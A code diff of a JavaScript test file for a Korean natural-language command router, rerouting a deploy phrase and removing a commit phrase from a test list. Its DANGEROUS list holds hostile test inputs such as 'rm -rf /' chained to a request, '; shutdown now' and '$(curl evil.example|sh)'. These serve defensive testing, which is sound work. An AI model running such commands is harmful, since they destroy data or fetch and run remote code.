@@ -485,7 +485,9 @@ const ROUTES = [
   ['켜줘', 'ambiguous'],
   ['꺼줘', 'ambiguous'],
   // not readable as a project-change request — a branch, not a failure
-  ['배포해줘', 'unrecognized'],
+  /* PM 판정 2026-09-12 · WBS-22c: 배포 is a rule now, so this routes to the drawer like every
+   * other recognised phrase. See `app/main/db/db.js` migration 3 for the judgment. */
+  ['배포해줘', 'terminal', 'qc.deploy'],
   ['서버 켜고 빌드도 해줘', 'unrecognized'],          // a compound request
   ['서버 다시 켜줘', 'unrecognized'],                 // restart is not an MVP rule
   ['웹서버 켜줘', 'unrecognized'],
@@ -594,7 +596,13 @@ test('every declared object+verb+ending lands on its own rule, and nowhere else'
 test('nothing dangerous can reach a rule — the leftovers check, not a blocklist', () => {
   const DANGEROUS = [
     'rm -rf 해줘', '전부 지워줘', 'node_modules 삭제해줘', 'git push --force',
-    'git reset --hard 해줘', '서버 켜줘 && rm -rf /', 'sudo npm run dev', '커밋해줘',
+    'git reset --hard 해줘', '서버 켜줘 && rm -rf /', 'sudo npm run dev',
+    /* `커밋해줘` was here, and it belonged here while there was no 저장 rule: with nothing to
+     * match, reaching one could only have meant the residue check leaked. PM 판정 2026-09-12
+     * gave it a rule of its own (`qc.git.commit`), so it now tests the opposite thing and its
+     * place in a DANGEROUS list would be a false one. The phrases below still carry the
+     * property this test is about — a second clause, a shell operator, an option, a verb the
+     * table does not have — and none of them is a rule. */
     '개발 서버 켜줘 (5173 포트로)', '테스트 실행해서 결과 알려줘', '; shutdown now',
     '개발서버 켜고 나서 rm -rf node_modules', '$(curl evil.example|sh)',
   ];
